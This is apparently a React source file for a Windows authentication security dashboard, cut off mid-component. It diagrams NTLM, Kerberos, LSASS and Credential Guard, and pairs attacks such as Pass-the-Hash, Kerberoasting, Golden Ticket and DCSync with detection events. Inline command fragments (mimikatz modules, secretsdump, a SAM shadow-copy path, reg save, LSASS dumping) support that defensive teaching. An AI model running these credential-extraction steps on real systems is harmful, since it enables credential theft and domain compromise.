import { useState } from "react";

const C = {
  bg: "#07080d",
  panel: "#090b14",
  header: "#0c1020",
  border: "#1a2038",
  cyan: "#00c8f0",
  green: "#00e87a",
  red: "#ff2850",
  orange: "#ff8c00",
  yellow: "#f0c030",
  purple: "#9060f0",
  teal: "#00d0b0",
  pink: "#f040a0",
  lime: "#88d830",
  sky: "#38b8f8",
  gold: "#d8a020",
  blue: "#4080f0",
  text: "#b0bcd0",
  dim: "#486070",
  bright: "#d8e8f8",
};

const mono = "'JetBrains Mono','Cascadia Code','Fira Code',monospace";

const S = {
  root: { background: C.bg, color: C.text, fontFamily: mono, minHeight: "100vh", fontSize: "12.5px", lineHeight: "1.65" },
  bar: { background: C.header, borderBottom: `1px solid ${C.border}`, padding: "7px 20px", display: "flex", alignItems: "center", gap: "14px", position: "sticky", top: 0, zIndex: 100 },
  dot: c => ({ width: 9, height: 9, borderRadius: "50%", background: c, display: "inline-block" }),
  wrap: { maxWidth: "1220px", margin: "0 auto", padding: "18px 14px", display: "flex", flexDirection: "column", gap: "14px" },
  panel: c => ({ background: C.panel, border: `1px solid ${c || C.border}`, borderRadius: "5px", overflow: "hidden" }),
  ph: c => ({ background: C.header, borderBottom: `1px solid ${c || C.border}`, padding: "9px 15px", display: "flex", alignItems: "center", gap: "9px" }),
  pt: c => ({ color: c || C.cyan, fontWeight: "700", fontSize: "11px", letterSpacing: "1.8px", textTransform: "uppercase" }),
  pb: { padding: "15px" },
  code: { background: "#040508", border: `1px solid ${C.border}`, borderRadius: "4px", padding: "11px 13px", fontFamily: mono, fontSize: "11.5px", overflowX: "auto", whiteSpace: "pre", lineHeight: "1.75" },
  grid2: { display: "grid", gridTemplateColumns: "1fr 1fr", gap: "14px" },
  grid3: { display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: "11px" },
  grid4: { display: "grid", gridTemplateColumns: "1fr 1fr 1fr 1fr", gap: "10px" },
  badge: c => ({ background: `${c}1a`, border: `1px solid ${c}55`, color: c, borderRadius: "3px", padding: "2px 7px", fontSize: "10.5px", fontWeight: "700" }),
  tag: c => ({ display: "inline-block", background: `${c}14`, border: `1px solid ${c}40`, color: c, borderRadius: "3px", padding: "1px 6px", fontSize: "10.5px", margin: "2px" }),
  sep: { borderColor: C.border, margin: "11px 0", borderStyle: "dashed", borderWidth: "0 0 1px 0" },
  row: { display: "flex", gap: "9px", marginBottom: "7px", alignItems: "flex-start" },
  bul: c => ({ color: c || C.cyan, minWidth: "13px", fontWeight: "700", marginTop: "1px" }),
  tab: (a, c) => ({ padding: "6px 13px", cursor: "pointer", fontFamily: mono, background: a ? `${c}1a` : "transparent", border: `1px solid ${a ? c : C.border}`, borderRadius: "4px", color: a ? c : C.dim, fontSize: "10.5px", fontWeight: a ? "700" : "400", letterSpacing: "0.5px", transition: "all 0.15s" }),
};

const PB = ({ title, icon, color, accent, children }) => (
  <div style={S.panel(accent || color || C.border)}>
    <div style={S.ph(accent || color || C.border)}>
      <span>{icon}</span><span style={S.pt(color || C.cyan)}>{title}</span>
    </div>
    <div style={S.pb}>{children}</div>
  </div>
);
const Pill = ({ c, children }) => <span style={S.badge(c || C.cyan)}>{children}</span>;
const Tag  = ({ c, children }) => <span style={S.tag(c || C.cyan)}>{children}</span>;
const Row  = ({ c, b, children }) => (
  <div style={S.row}><span style={S.bul(c)}>{b || "▸"}</span><span style={{ color: C.text }}>{children}</span></div>
);
const KV   = ({ k, v, kc }) => (
  <div style={{ display: "flex", gap: "8px", marginBottom: "5px" }}>
    <span style={{ color: kc || C.teal, minWidth: "200px", fontWeight: "600" }}>{k}</span>
    <span style={{ color: C.dim }}>:</span><span style={{ color: C.bright }}>{v}</span>
  </div>
);

/* ── NTLM Flow SVG ──────────────────────────────────────────────────────── */
const NTLMFlow = () => (
  <svg viewBox="0 0 760 380" style={{ width: "100%", maxWidth: "760px", display: "block", margin: "0 auto" }}>
    <text x="380" y="14" textAnchor="middle" fill="#486070" fontSize="10" letterSpacing="2">NTLM CHALLENGE-RESPONSE AUTHENTICATION FLOW</text>

    {/* Actors */}
    {[["CLIENT\n(workstation)", C.cyan, 80], ["SERVER\n(resource)", C.green, 380], ["DC / KDC\n(domain ctrl)", C.yellow, 640]].map(([label, color, x]) => (
      <g key={label}>
        <rect x={x - 60} y="22" width="120" height="50" rx="4" fill={`${color}14`} stroke={`${color}55`} strokeWidth="1.5" />
        <text x={x} y="44" textAnchor="middle" fill={color} fontSize="10" fontWeight="700">{label.split("\n")[0]}</text>
        <text x={x} y="60" textAnchor="middle" fill={color} fontSize="9">{label.split("\n")[1]}</text>
        <line x1={x} y1="72" x2={x} y2="370" stroke={`${color}22`} strokeWidth="1" strokeDasharray="4,4" />
      </g>
    ))}

    {/* Messages */}
    {[
      { from: 80, to: 380, y: 100, label: "① NEGOTIATE_MESSAGE", detail: "Client capabilities: NTLMSSP flags (NTLMv2, extended security, signing)", color: C.cyan },
      { from: 380, to: 80, y: 140, label: "② CHALLENGE_MESSAGE", detail: "Server nonce (8-byte random ServerChallenge). Client must respond to this.", color: C.green },
      { from: 80, to: 380, y: 190, label: "③ AUTHENTICATE_MESSAGE", detail: "NTHash(password) + HMAC-MD5(ServerChallenge+ClientChallenge) = NTLMv2 Response", color: C.cyan },
      { from: 380, to: 640, y: 240, label: "④ NetLogon / NTLM pass-through", detail: "Server forwards client credentials to DC via secure channel (NetLogon RPC)", color: C.orange },
      { from: 640, to: 380, y: 290, label: "⑤ DC validates & returns status", detail: "DC recomputes expected response using stored NT hash. Match = access granted.", color: C.yellow },
      { from: 380, to: 80, y: 330, label: "⑥ Access granted / denied", detail: "Server creates session security context. SMB session key derived.", color: C.green },
    ].map(({ from, to, y, label, detail, color }) => (
      <g key={label}>
        <line x1={from} y1={y} x2={to} y2={y} stroke={`${color}88`} strokeWidth="1.5" markerEnd={to > from ? "url(#ra)" : "url(#la)"} />
        <text x={(from + to) / 2} y={y - 5} textAnchor="middle" fill={color} fontSize="9.5" fontWeight="700">{label}</text>
        <text x={(from + to) / 2} y={y + 12} textAnchor="middle" fill="#486070" fontSize="8.5">{detail.length > 65 ? detail.slice(0, 65) + "…" : detail}</text>
      </g>
    ))}

    {/* Markers */}
    <defs>
      <marker id="ra" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L0,6 L8,3 z" fill="#ffffff44" /></marker>
      <marker id="la" markerWidth="8" markerHeight="8" refX="2" refY="3" orient="auto"><path d="M8,0 L8,6 L0,3 z" fill="#ffffff44" /></marker>
    </defs>

    {/* Vulnerability callout */}
    <rect x="10" y="355" width="740" height="20" rx="3" fill="#ff285014" stroke="#ff285033" strokeWidth="1" />
    <text x="380" y="369" textAnchor="middle" fill="#ff2850" fontSize="9" fontWeight="700">⚠ NTLM WEAKNESSES: No mutual auth · No replay protection in NTLMv1 · NT hash is password-equivalent (Pass-the-Hash) · Relay attacks (NTLM relay) · No forward secrecy</text>
  </svg>
);

/* ── Kerberos Flow SVG ──────────────────────────────────────────────────── */
const KerberosFlow = () => (
  <svg viewBox="0 0 760 460" style={{ width: "100%", maxWidth: "760px", display: "block", margin: "0 auto" }}>
    <text x="380" y="14" textAnchor="middle" fill="#486070" fontSize="10" letterSpacing="2">KERBEROS v5 AUTHENTICATION FLOW — WINDOWS ACTIVE DIRECTORY</text>

    {[["CLIENT", C.cyan, 80], ["KDC / AS\n(Auth Service)", C.yellow, 340], ["KDC / TGS\n(Ticket Granting)", C.purple, 560], ["SERVICE\n(file srv, etc)", C.green, 720]].map(([label, color, x]) => (
      <g key={label}>
        <rect x={x - 55} y="22" width="110" height="50" rx="4" fill={`${color}14`} stroke={`${color}55`} strokeWidth="1.5" />
        <text x={x} y="44" textAnchor="middle" fill={color} fontSize="10" fontWeight="700">{label.split("\n")[0]}</text>
        <text x={x} y="60" textAnchor="middle" fill={color} fontSize="9">{label.split("\n")[1] || ""}</text>
        <line x1={x} y1="72" x2={x} y2="450" stroke={`${color}22`} strokeWidth="1" strokeDasharray="4,4" />
      </g>
    ))}

    {[
      { from: 80, to: 340, y: 94, label: "① AS-REQ", detail: "Username + timestamp encrypted with user's NT hash (pre-auth). Requests TGT.", color: C.cyan },
      { from: 340, to: 80, y: 134, label: "② AS-REP → TGT issued", detail: "TGT encrypted with KRBTGT secret key. Session key encrypted with user's NT hash.", color: C.yellow },
      { from: 80, to: 560, y: 182, label: "③ TGS-REQ", detail: "Client sends TGT + authenticator to TGS. Requests service ticket for target SPN.", color: C.cyan },
      { from: 560, to: 80, y: 222, label: "④ TGS-REP → Service Ticket", detail: "Service ticket encrypted with TARGET SERVICE's secret key. Client cannot read it.", color: C.purple },
      { from: 80, to: 720, y: 270, label: "⑤ AP-REQ", detail: "Client presents service ticket + authenticator to service. Service decrypts with own key.", color: C.cyan },
      { from: 720, to: 80, y: 310, label: "⑥ AP-REP (mutual auth)", detail: "Service proves it could decrypt ticket (mutual authentication — absent in NTLM).", color: C.green },
    ].map(({ from, to, y, label, detail, color }) => (
      <g key={label}>
        <line x1={from + (to > from ? 10 : -10)} y1={y} x2={to + (to > from ? -10 : 10)} y2={y} stroke={`${color}88`} strokeWidth="1.5" markerEnd={to > from ? "url(#ra)" : "url(#la)"} />
        <text x={(from + to) / 2} y={y - 5} textAnchor="middle" fill={color} fontSize="9.5" fontWeight="700">{label}</text>
        <text x={(from + to) / 2} y={y + 11} textAnchor="middle" fill="#486070" fontSize="8.5">{detail.length > 70 ? detail.slice(0, 70) + "…" : detail}</text>
      </g>
    ))}

    {/* Key structures */}
    {[
      { label: "TGT structure\n(encrypted with KRBTGT key)", color: C.yellow, x: 10, y: 340 },
      { label: "Service Ticket structure\n(encrypted with service key)", color: C.purple, x: 260, y: 340 },
      { label: "PAC (Privilege Attribute Certificate)\nuser SIDs + group memberships + privileges", color: C.orange, x: 510, y: 340 },
    ].map(({ label, color, x, y }) => (
      <g key={label}>
        <rect x={x} y={y} width="230" height="50" rx="3" fill={`${color}0c`} stroke={`${color}44`} strokeWidth="1.5" />
        <text x={x + 115} y={y + 18} textAnchor="middle" fill={color} fontSize="9.5" fontWeight="700">{label.split("\n")[0]}</text>
        <text x={x + 115} y={y + 34} textAnchor="middle" fill="#486070" fontSize="8.5">{label.split("\n")[1]}</text>
      </g>
    ))}

    <text x="380" y="420" textAnchor="middle" fill="#486070" fontSize="8.5">Ticket lifetime: TGT = 10 hours (renewable 7 days) · Service ticket = 10 hours · All times in UTC</text>
    <rect x="10" y="428" width="740" height="20" rx="3" fill="#9060f014" stroke="#9060f033" strokeWidth="1" />
    <text x="380" y="442" textAnchor="middle" fill="#9060f0" fontSize="9" fontWeight="700">KERBEROS ATTACK TARGETS: TGT (Golden Ticket via KRBTGT hash) · Service Ticket (Silver Ticket) · AS-REP (AS-REP Roasting) · TGS-REP (Kerberoasting) · PAC (forgery)</text>
  </svg>
);

/* ── LSASS Architecture ─────────────────────────────────────────────────── */
const LSASSArch = () => (
  <svg viewBox="0 0 760 380" style={{ width: "100%", maxWidth: "760px", display: "block", margin: "0 auto" }}>
    <text x="380" y="14" textAnchor="middle" fill="#486070" fontSize="10" letterSpacing="2">LSASS INTERNAL ARCHITECTURE — lsass.exe (PID ~900)</text>

    {/* Central LSASS box */}
    <rect x="200" y="24" width="360" height="50" rx="4" fill="#0c0f18" stroke="#ff285055" strokeWidth="2" />
    <text x="380" y="46" textAnchor="middle" fill="#ff2850" fontSize="12" fontWeight="800">lsass.exe — Local Security Authority Subsystem</text>
    <text x="380" y="64" textAnchor="middle" fill="#486070" fontSize="9">PPL-protected process · Parent: wininit.exe · Token: SYSTEM · Integrity: System</text>

    {/* SSP/AP packages */}
    <text x="380" y="94" textAnchor="middle" fill="#486070" fontSize="9" letterSpacing="1">SECURITY SUPPORT PROVIDER / AUTHENTICATION PACKAGES (SSP/AP) loaded into lsass</text>
    {[
      { name: "MSV1_0\n(NTLM)", color: C.cyan, desc: "NTLMv1/v2 auth. Stores NT hashes. Pass-the-Hash source.", x: 10 },
      { name: "Kerberos\n(kerberos.dll)", color: C.yellow, desc: "Kerberos v5. TGT/ticket cache. Pass-the-Ticket source.", x: 150 },
      { name: "WDigest\n(wdigest.dll)", color: C.red, desc: "HTTP digest. Stores plaintext creds if enabled. DISABLE.", x: 290 },
      { name: "TSPKG\n(tspkg.dll)", color: C.orange, desc: "Terminal Services / RDP credential support.", x: 430 },
      { name: "LiveSSP\n(livessp.dll)", color: C.dim, desc: "Microsoft Account auth.", x: 570 },
      { name: "CredSSP\n(credssp.dll)", color: C.teal, desc: "Credential delegation (DoubleHop). RDP + WinRM.", x: 640 },
    ].map(({ name, color, desc, x }) => (
      <g key={name}>
        <rect x={x} y={102} width="128" height="66" rx="3" fill={`${color}0c`} stroke={`${color}44`} strokeWidth="1.5" />
        <text x={x + 64} y={120} textAnchor="middle" fill={color} fontSize="10" fontWeight="700">{name.split("\n")[0]}</text>
        <text x={x + 64} y={134} textAnchor="middle" fill="#486070" fontSize="8.5">{name.split("\n")[1]}</text>
        <text x={x + 64} y={150} textAnchor="middle" fill="#6a7a8c" fontSize="8" style={{textAnchor:"middle"}}>{desc.slice(0, 28)}</text>
        <text x={x + 64} y={162} textAnchor="middle" fill="#6a7a8c" fontSize="8">{desc.slice(28)}</text>
        <line x1={x + 64} y1={74} x2={x + 64} y2={102} stroke={`${color}33`} strokeWidth="1" strokeDasharray="3,2" />
      </g>
    ))}

    {/* Credential stores */}
    <text x="380" y="192" textAnchor="middle" fill="#486070" fontSize="9" letterSpacing="1">CREDENTIAL CACHES (in lsass process memory)</text>
    {[
      { label: "NT Hash Store\n(MSV1_0)", color: C.cyan, x: 10, desc: "NTLM hashes of logged-on users. Password-equivalent. Extractable even with Credential Guard? No — VSM isolation." },
      { label: "Kerberos Ticket Cache\n(CREDENTIALS)", color: C.yellow, x: 260, desc: "TGTs + service tickets. klist lists them. Pass-the-Ticket steals TGT from here via LSASS read." },
      { label: "LSA Secrets\n(HKLM\\SECURITY)", color: C.red, x: 510, desc: "Service account passwords, cached domain creds (DCC2 hashes), DPAPI master keys." },
    ].map(({ label, color, x, desc }) => (
      <g key={label}>
        <rect x={x} y={200} width="230" height="60" rx="3" fill={`${color}0c`} stroke={`${color}44`} strokeWidth="1.5" />
        <text x={x + 115} y={218} textAnchor="middle" fill={color} fontSize="10" fontWeight="700">{label.split("\n")[0]}</text>
        <text x={x + 115} y={232} textAnchor="middle" fill="#486070" fontSize="8.5">{label.split("\n")[1]}</text>
        <text x={x + 115} y={248} textAnchor="middle" fill="#6a7a8c" fontSize="8.5">{desc.slice(0, 55)}</text>
      </g>
    ))}

    {/* Interfaces */}
    <text x="380" y="284" textAnchor="middle" fill="#486070" fontSize="9" letterSpacing="1">LSASS INTERFACES</text>
    {[
      { label: "LsaLogonUser()\nLPC/ALPC port", color: C.cyan, x: 10 },
      { label: "Netlogon\nSecure Channel", color: C.green, x: 200 },
      { label: "SChannel (TLS)\nCertificate auth", color: C.teal, x: 390 },
      { label: "SAM RPC\nLocal accounts", color: C.purple, x: 580 },
    ].map(({ label, color, x }) => (
      <g key={label}>
        <rect x={x} y={292} width="168" height="46" rx="3" fill={`${color}0c`} stroke={`${color}33`} strokeWidth="1" />
        <text x={x + 84} y={310} textAnchor="middle" fill={color} fontSize="9.5" fontWeight="700">{label.split("\n")[0]}</text>
        <text x={x + 84} y={326} textAnchor="middle" fill="#486070" fontSize="8.5">{label.split("\n")[1]}</text>
      </g>
    ))}

    <text x="380" y="360" textAnchor="middle" fill="#ff2850" fontSize="9" fontWeight="700">⚠ lsass.exe IS THE CROWN JEWEL — PPL + Credential Guard + ASR rule are the mandatory defenses</text>

    {/* Attack arrows */}
    <text x="10" y="375" fill="#ff2850" fontSize="8">← MiniDumpWriteDump / comsvcs.dll / procdump → NTLM hashes · ← klist / Rubeus → TGT tickets · ← secretsdump → LSA secrets</text>
  </svg>
);

/* ── Credential Guard Diagram ───────────────────────────────────────────── */
const CredGuardDiagram = () => (
  <svg viewBox="0 0 760 340" style={{ width: "100%", maxWidth: "760px", display: "block", margin: "0 auto" }}>
    <text x="380" y="14" textAnchor="middle" fill="#486070" fontSize="10" letterSpacing="2">CREDENTIAL GUARD — VSM ISOLATION ARCHITECTURE</text>

    {/* Normal OS */}
    <rect x="10" y="24" width="340" height="300" rx="4" fill="#08090e" stroke="#ff285033" strokeWidth="1.5" />
    <text x="180" y="42" textAnchor="middle" fill="#ff2850" fontSize="10" fontWeight="700" letterSpacing="1">NORMAL OS (VTL 0)</text>
    <text x="180" y="56" textAnchor="middle" fill="#486070" fontSize="9">Kernel + user mode applications</text>

    {[
      { label: "lsass.exe (VTL 0)", color: C.orange, y: 70, desc: "Without Credential Guard:\nstores NT hashes + TGTs in memory\n→ extractable via ReadProcessMemory" },
      { label: "NT Kernel (VTL 0)", color: C.cyan, y: 170, desc: "Drivers, syscalls, process management\nAll normal OS operations here" },
      { label: "Applications (VTL 0)", color: C.dim, y: 250, desc: "Chrome, Word, etc.\nCan potentially access lsass memory\nif PPL not enabled" },
    ].map(({ label, color, y, desc }) => (
      <g key={label}>
        <rect x="20" y={y} width="320" height="80" rx="3" fill={`${color}0c`} stroke={`${color}44`} strokeWidth="1.5" />
        <text x="180" y={y + 20} textAnchor="middle" fill={color} fontSize="10" fontWeight="700">{label}</text>
        {desc.split("\n").map((l, i) => (
          <text key={i} x="180" y={y + 36 + i * 14} textAnchor="middle" fill="#486070" fontSize="8.5">{l}</text>
        ))}
      </g>
    ))}

    {/* VSM Secure World */}
    <rect x="370" y="24" width="380" height="300" rx="4" fill="#080e14" stroke="#00e87a44" strokeWidth="2" />
    <text x="560" y="42" textAnchor="middle" fill="#00e87a" fontSize="10" fontWeight="700" letterSpacing="1">SECURE WORLD — VSM / VTL 1 (Hyper-V enforced)</text>
    <text x="560" y="56" textAnchor="middle" fill="#486070" fontSize="9">Isolated execution environment — VTL 0 kernel CANNOT access</text>

    {[
      { label: "Isolated User Mode (IUM)\nlsaIso.exe", color: C.green, y: 70, desc: "NT hashes + Kerberos TGTs\nstored HERE — VTL 0 inaccessible\neven to SYSTEM or kernel exploit" },
      { label: "Secure Kernel\n(skci.dll + vmsecmon)", color: C.teal, y: 175, desc: "HVCI + Secure Boot enforcement\nCode integrity at hypervisor level\nBlocks unsigned kernel code" },
      { label: "Hypervisor (Hyper-V)", color: C.purple, y: 262, desc: "Hardware VT-x/AMD-V enforces VTL boundary\nVTL 0 cannot access VTL 1 memory pages" },
    ].map(({ label, color, y, desc }) => (
      <g key={label}>
        <rect x="380" y={y} width="360" height="88" rx="3" fill={`${color}0c`} stroke={`${color}55`} strokeWidth="1.5" />
        <text x="560" y={y + 20} textAnchor="middle" fill={color} fontSize="10" fontWeight="700">{label.split("\n")[0]}</text>
        <text x="560" y={y + 34} textAnchor="middle" fill={color} fontSize="9">{label.split("\n")[1]}</text>
        {desc.split("\n").map((l, i) => (
          <text key={i} x="560" y={y + 52 + i * 14} textAnchor="middle" fill="#486070" fontSize="8.5">{l}</text>
        ))}
      </g>
    ))}

    {/* Blocked arrow */}
    <line x1="350" y1="120" x2="378" y2="120" stroke="#ff285088" strokeWidth="2" />
    <text x="354" y="115" fill="#ff2850" fontSize="14" fontWeight="900">✗</text>
    <text x="340" y="140" textAnchor="middle" fill="#ff2850" fontSize="8.5">BLOCKED</text>
    <text x="340" y="152" textAnchor="middle" fill="#ff2850" fontSize="8.5">by VTL</text>
  </svg>
);

/* ── SAM Database Internals ─────────────────────────────────────────────── */
const SAMInternals = () => (
  <div>
    <div style={S.grid2}>
      <div>
        <div style={{ color: C.purple, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ SAM HIVE STRUCTURE</div>
        <div style={S.code}>
{`HKLM\\SAM\\SAM\\Domains\\Account\\Users`}
{`  ├─ 000001F4  → Administrator (RID 500)`}
{`  │    V value: binary blob containing:`}
{`  │      - Username (Unicode)`}
{`  │      - LM hash (disabled on Vista+, zeroed)`}
{`  │      - NT hash (RC4/AES encrypted with SysKey)`}
{`  │      - Account flags (locked/disabled/pwd-required)`}
{`  │      - Last logon time (FILETIME)`}
{`  │      - Password last set (FILETIME)`}
{`  │      - Bad password count`}
{`  ├─ 000001F5  → Guest (RID 501)`}
{`  ├─ 000003E8  → First created user (RID 1000+)`}
{`  └─ Names\\`}
{`       └─ Administrator → (key only, maps to RID)`}
{``}
{`# SysKey (BootKey) encrypts SAM hashes:`}
{`# 4 registry keys: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa`}
{`# JD, Skew1, GBG, Data → scrambled bytes → AES-128 key`}
{`# impacket-secretsdump combines all three: SAM+SECURITY+SYSTEM`}
        </div>
      </div>
      <div>
        <div style={{ color: C.orange, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ SAM ACCESS PROTECTION</div>
        {[
          ["SYSTEM-only ACL", "SAM registry key DACL grants access only to NT AUTHORITY\\SYSTEM. Even Administrators get ACCESS_DENIED unless they use reg save trick.", C.orange],
          ["SysKey (BootKey) encryption", "NT hashes in SAM are encrypted with SysKey derived from 4 scrambled registry key bytes. Offline extraction needs SYSTEM hive too.", C.yellow],
          ["VSS Shadow copy bypass", "Even with ACCESS_DENIED, copy from VSS: copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\system32\\config\\SAM C:\\sam", C.red],
          ["Volume Shadow + reg save", "On live system with SYSTEM token: reg save HKLM\\SAM → exports current hive including encrypted hashes for offline cracking.", C.orange],
          ["Protected by PPL chain", "lsass.exe with PPL prevents token theft needed for SAM access. Credential Guard removes need for direct SAM extraction.", C.green],
        ].map(([t, d, c]) => (
          <div key={t} style={{ background: "#0a090d", border: `1px solid ${c}22`, borderRadius: "4px", padding: "9px", marginBottom: "7px" }}>
            <div style={{ color: c, fontSize: "11px", fontWeight: "700", marginBottom: "3px" }}>▸ {t}</div>
            <div style={{ color: C.dim, fontSize: "10.5px" }}>{d}</div>
          </div>
        ))}
      </div>
    </div>
  </div>
);

/* ── Auth Attack Matrix ─────────────────────────────────────────────────── */
const AttackMatrix = ({ tab }) => {
  const attacks = {
    ntlm: [
      { name: "Pass-the-Hash (PtH)", color: C.red,
        target: "NTLM NT hash (from LSASS dump or SAM)", prereq: "SYSTEM/admin on source host",
        how: "Inject NT hash into authentication without knowing plaintext password. mimikatz sekurlsa::pth /user:admin /ntlm:<hash> spawns process with impersonated token. Lateral movement via SMB, WMI, WinRM using hash directly.",
        detect: "Event 4624 LogonType=3 from unexpected source. Event 4648 explicit credential logon. Source and dest IP correlation with MDE alerts.", ioc: "4624 LogonType=9 (NewCredentials) from non-interactive context. Same NT hash authenticating from multiple hosts simultaneously." },
      { name: "NTLM Relay Attack", color: C.orange,
        target: "NTLM challenge-response in flight (no signing)", prereq: "Network position (ARP spoof / LLMNR poisoning / mitm6)",
        how: "Capture NTLM auth from victim → relay to target server in real-time. Responder poisons LLMNR/NBT-NS → victim authenticates to attacker → attacker relays to DC/file share. No hash cracking needed. SMB signing MUST be enforced to prevent.",
        detect: "Event 4624 from unexpected IP. Responder activity: LLMNR/NBT-NS queries answered from rogue host. NetSess monitoring for unexpected SMB sessions.", ioc: "LLMNR/NBT-NS response from non-DNS server IP. SMB sessions to DC with non-admin source. impacket-ntlmrelayx tool signatures." },
      { name: "NTLMv1 Downgrade + Crack", color: C.yellow,
        target: "NTLMv1 response (DES-based, 56-bit key)", prereq: "Control over server or MITM position",
        how: "Force NTLMv1 auth (LmCompatibilityLevel ≤ 2 on client). NTLMv1 response is DES-based with 56-bit effective key. Crack with rainbow tables or cloud GPU in hours. Mitigated by enforcing NTLMv2 only (Level 5).",
        detect: "Event 4624 with LmPackageName = NTLM V1 (vs V2). Monitor LmCompatibilityLevel registry value changes.", ioc: "Event 4624 with AuthenticationPackageName = NTLM and LmPackageName = NTLM V1" },
    ],
    kerberos: [
      { name: "Kerberoasting", color: C.red,
        target: "Service account Kerberos tickets (TGS)", prereq: "Any valid domain user account",
        how: "Request service ticket for SPNs registered to service accounts. Service ticket encrypted with service account's NT hash (RC4 by default). Export ticket, crack offline with hashcat. No elevated privileges needed — any domain user can request TGS.",
        detect: "Event 4769 (Service Ticket requested) with Ticket Encryption Type = 0x17 (RC4) for sensitive SPNs. Baseline: alert on TGS requests with RC4 for accounts not using RC4 normally.", ioc: "Burst of Event 4769 for multiple SPNs from single user. Encryption type 0x17 (RC4) when AES256 is org standard." },
      { name: "AS-REP Roasting", color: C.orange,
        target: "Kerberos AS-REP for accounts with pre-auth disabled", prereq: "Network access to KDC (no credentials needed)",
        how: "Accounts with 'Do not require Kerberos preauthentication' flag set return AS-REP encrypted with NT hash WITHOUT verifying identity. Request AS-REP without providing credentials → crack encrypted portion offline.",
        detect: "Event 4768 with Pre-Authentication Type = 0 (no pre-auth). Any accounts with DONT_REQ_PREAUTH flag = audit immediately.", ioc: "Event 4768 Preauth-Type=0. User account attribute: ADS_UF_DONT_REQUIRE_PREAUTH set." },
      { name: "Golden Ticket Attack", color: C.purple,
        target: "KRBTGT account NT hash (Domain Controller compromise)", prereq: "DCSync rights or DC compromise (Domain Admin)",
        how: "KRBTGT secret key signs all TGTs. With KRBTGT hash: forge TGTs for ANY user, any group, any domain. Ticket valid for up to 10 years. Survives password resets (need to reset KRBTGT twice). mimikatz kerberos::golden.",
        detect: "Forged TGT characteristics: unusually long lifetime (>10h). UserID in ticket doesn't match actual user in AD. Event 4769 for service tickets from non-existent or impossible accounts.", ioc: "Event 4624 with LogonType=3 from DC-to-DC where source is a workstation. Ticket lifetime > org policy (10 hours default)." },
      { name: "Silver Ticket Attack", color: C.pink,
        target: "Service account NT hash (from LSASS dump)", prereq: "Service account hash (lower privilege than Golden)",
        how: "Service tickets are encrypted with the SERVICE account's key (not KRBTGT). Forge service ticket for specific SPN. KDC not involved in verification → no DC event logs. Access specific service as any user. CIFS Silver Ticket = full file share access.",
        detect: "Silver tickets bypass KDC → no Event 4769 for that ticket. Event 4624 on target service shows no preceding TGS-REQ on DC. PAC validation failures (if PVAP enabled).", ioc: "Service auth with no corresponding TGS event on DC. PAC validation failure events on service host." },
      { name: "DCSync Attack", color: C.red,
        target: "Active Directory replication rights (DS-Replication-Get-Changes-All)", prereq: "Domain Admin or explicit DCSync rights",
        how: "Abuse AD replication protocol (DRS — Directory Replication Service). Pretend to be a DC, request replication of specific account attributes including NT hashes. mimikatz lsadump::dcsync /user:krbtgt. No file on disk, no LSASS handle — purely over LDAP.",
        detect: "Event 4662 (operation performed on AD object) with GUID matching DS-Replication-Get-Changes-All from a non-DC machine. Source IP = workstation or member server (not DC) is the key indicator.", ioc: "Event 4662 from non-DC source. DS-Replication access from non-DC computer object account." },
    ],
    credential: [
      { name: "LSASS Memory Dump", color: C.red,
        target: "lsass.exe process memory", prereq: "SYSTEM or PROCESS_VM_READ on lsass",
        how: "MiniDumpWriteDump() via comsvcs.dll, procdump.exe, or Task Manager. Dump contains all SSP credential material: NT hashes, Kerberos tickets, WDigest plaintext (if enabled). Analyze offline with mimikatz.",
        detect: "Sysmon Event 10 (ProcessAccess) with target=lsass.exe and access mask including PROCESS_VM_READ (0x10). ASR rule: Block credential stealing from the Windows local security authority subsystem.", ioc: "Event 10: source=non-lsass.exe, target=lsass.exe, access=0x1010 or 0x1fffff. LSASS dump file creation in temp directory." },
      { name: "DCC2 — Cached Domain Credentials", color: C.orange,
        target: "HKLM\\SECURITY\\Cache (offline-crackable)", prereq: "SYSTEM token for registry access",
        how: "Windows caches last N domain logons locally (DCC2 = Domain Cached Credentials v2). MSCASHv2 hash algorithm. Allows domain users to log in without DC connectivity. Extract with secretsdump: impacket-secretsdump LOCAL -sam sam -security security -system system. Crack with hashcat mode 2100.",
        detect: "Monitor HKLM\\SECURITY\\Cache registry access (SACL + Event 4663). Limit cached logons via GPO (Interactive logon: Number of previous logons to cache = 0 or 1 for sensitive hosts).", ioc: "Reg save on HKLM\\SECURITY. Event 4663 on HKLM\\SECURITY\\Cache from non-system process." },
    ]
  };
  const items = attacks[tab] || [];
  return (
    <div>
      {items.map(item => (
        <div key={item.name} style={{ background: "#08090d", border: `1px solid ${item.color}33`, borderRadius: "5px", padding: "14px", marginBottom: "12px" }}>
          <div style={{ display: "flex", gap: "12px", alignItems: "center", marginBottom: "8px", flexWrap: "wrap" }}>
            <span style={{ color: item.color, fontWeight: "800", fontSize: "13px" }}>{item.name}</span>
            <span style={S.badge(item.color)}>TARGET: {item.target}</span>
            <span style={S.badge(C.dim)}>PREREQ: {item.prereq}</span>
          </div>
          <div style={S.grid2}>
            <div>
              <div style={{ color: item.color, fontWeight: "700", fontSize: "11px", marginBottom: "6px" }}>▸ HOW IT WORKS</div>
              <div style={{ color: C.dim, fontSize: "11px", lineHeight: "1.7", borderLeft: `2px solid ${item.color}44`, paddingLeft: "10px" }}>{item.how}</div>
            </div>
            <div>
              <div style={{ color: C.green, fontWeight: "700", fontSize: "11px", marginBottom: "6px" }}>▸ DETECTION</div>
              <div style={{ background: "#08120a", border: `1px solid ${C.green}22`, borderRadius: "3px", padding: "8px", marginBottom: "8px" }}>
                <div style={{ color: C.dim, fontSize: "11px" }}>{item.detect}</div>
              </div>
              <div style={{ color: C.red, fontWeight: "700", fontSize: "11px", marginBottom: "4px" }}>▸ IOC SIGNATURE</div>
              <div style={{ background: "#120808", border: `1px solid ${C.red}22`, borderRadius: "3px", padding: "8px" }}>
                <div style={{ color: C.dim, fontSize: "11px" }}>{item.ioc}</div>
              </div>
            </div>
          </div>
        </div>
      ))}
    </div>
  );
};

/* ── Auth Workflow ────────────────────────────────────────────────────────── */
const AuthWorkflow = () => {
  const steps = [
